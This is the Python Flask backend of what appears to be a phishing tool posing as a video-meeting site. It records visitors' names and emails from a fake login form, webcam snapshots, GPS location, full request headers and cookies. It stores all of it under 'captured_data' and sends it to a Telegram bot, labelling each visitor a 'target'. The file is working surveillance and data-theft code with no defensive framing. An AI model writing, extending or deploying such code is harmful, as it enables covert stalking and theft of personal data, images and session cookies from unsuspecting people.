from flask import Flask, render_template, request, jsonify
import cv2
import os
import time
import json
import datetime
from PIL import Image
import base64
import io
import logging
import telegram_bot as tg  # Import our Telegram bot module

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create directories for storing captured data
os.makedirs('captured_data/images', exist_ok=True)
os.makedirs('captured_data/info', exist_ok=True)
os.makedirs('captured_data/location', exist_ok=True)

# Tracking for users to avoid duplicate notifications
user_tracking = {}

# Test Telegram connection on startup
tg.test_connection()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save_user_info', methods=['POST'])
def save_user_info():
    """Save user info from the login form"""
    data = request.get_json()
    session_id = request.remote_addr  # Use IP as session ID
    
    user_info = {
        'user_name': data.get('name', ''),
        'user_email': data.get('email', ''),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'session_id': session_id
    }
    
    # Save the user info
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    info_path = f"captured_data/info/user_info_{timestamp}.json"
    with open(info_path, 'w') as f:
        json.dump(user_info, f, indent=4)
    
    # Track this user
    user_tracking[session_id] = {
        'info_sent': False,
        'location_sent': False,
        'user_info': user_info
    }
    
    return jsonify({'status': 'success'})

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    session_id = request.remote_addr  # Use IP as session ID
    
    # Initialize user tracking if not exists
    if session_id not in user_tracking:
        user_tracking[session_id] = {
            'info_sent': False,
            'location_sent': False,
            'user_info': {
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        }
    
    # Get the image data
    img_data = data.get('image', '')
    img_path = None
    if img_data:
        # Remove the data URL prefix
        img_data = img_data.replace('data:image/jpeg;base64,', '')
        img_data = img_data.replace('data:image/png;base64,', '')
        
        # Decode base64 image
        try:
            img = Image.open(io.BytesIO(base64.b64decode(img_data)))
            
            # Save the image
            img_path = f"captured_data/images/capture_{timestamp}.jpg"
            img.save(img_path)
            logger.info(f"Image saved to {img_path}")
        except Exception as e:
            logger.error(f"Error processing image: {e}")
    
    # Get location data
    location_data = data.get('location')
    if location_data and not user_tracking[session_id]['location_sent']:
        try:
            # Save location data
            location_path = f"captured_data/location/location_{timestamp}.json"
            with open(location_path, 'w') as f:
                json.dump(location_data, f, indent=4)
            logger.info(f"Location data saved to {location_path}")
            
            # Update user tracking
            user_tracking[session_id]['location_sent'] = True
            
            # Add location to user info
            user_tracking[session_id]['user_info']['location'] = location_data
        except Exception as e:
            logger.error(f"Error saving location data: {e}")
    
    # Get user information for the log file
    user_info = {
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'headers': dict(request.headers),
        'cookies': dict(request.cookies)
    }
    
    # Add location data to user info
    if location_data:
        user_info['location'] = location_data
    
    # Save user information
    info_path = f"captured_data/info/info_{timestamp}.json"
    with open(info_path, 'w') as f:
        json.dump(user_info, f, indent=4)
    
    # Send data to Telegram
    try:
        # Send user data notification only once per session
        if not user_tracking[session_id]['info_sent']:
            # Get complete user info
            complete_user_info = user_tracking[session_id]['user_info']
            
            # Send it
            tg.send_user_data(complete_user_info)
            
            # If we have location, send it once
            if location_data and 'latitude' in location_data and 'longitude' in location_data:
                caption = f"Target location at {user_info['timestamp']}"
                tg.send_location(location_data['latitude'], location_data['longitude'], caption)
            
            # Mark as sent
            user_tracking[session_id]['info_sent'] = True
            
            # Send the full JSON data as a document
            tg.send_document(info_path, "Full user data")
        
        # Always send the images
        if img_path:
            caption = f"Target image captured at {user_info['timestamp']}"
            tg.send_photo(img_path, caption)
        
    except Exception as e:
        logger.error(f"Error sending data to Telegram: {e}")
    
    return jsonify({'status': 'success'})

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    session_id = request.remote_addr  # Use IP as session ID
    
    # Initialize user tracking if not exists
    if session_id not in user_tracking:
        user_tracking[session_id] = {
            'info_sent': False,
            'location_sent': False,
            'user_info': {
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        }
    
    try:
        # Save location data
        location_path = f"captured_data/location/location_{timestamp}.json"
        with open(location_path, 'w') as f:
            json.dump(data, f, indent=4)
        logger.info(f"Location data saved to {location_path}")
        
        # Update user tracking only if this is the first location data
        if not user_tracking[session_id]['location_sent']:
            user_tracking[session_id]['location_sent'] = True
            user_tracking[session_id]['user_info']['location'] = data
            
            # Send to Telegram only once per session
            if 'latitude' in data and 'longitude' in data:
                caption = f"Target location at {user_tracking[session_id]['user_info']['timestamp']}"
                tg.send_location(data['latitude'], data['longitude'], caption)
            
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error processing location data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/meeting')
def meeting():
    # Log new meeting session
    user_info = {
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'event': 'meeting_joined'
    }
    
    # Notify on Telegram
    try:
        tg.send_message(f"🔵 <b>New target joined meeting</b>\nIP: {user_info['ip']}\nTime: {user_info['timestamp']}")
    except Exception as e:
        logger.error(f"Error sending meeting notification to Telegram: {e}")
    
    return render_template('meeting.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000) 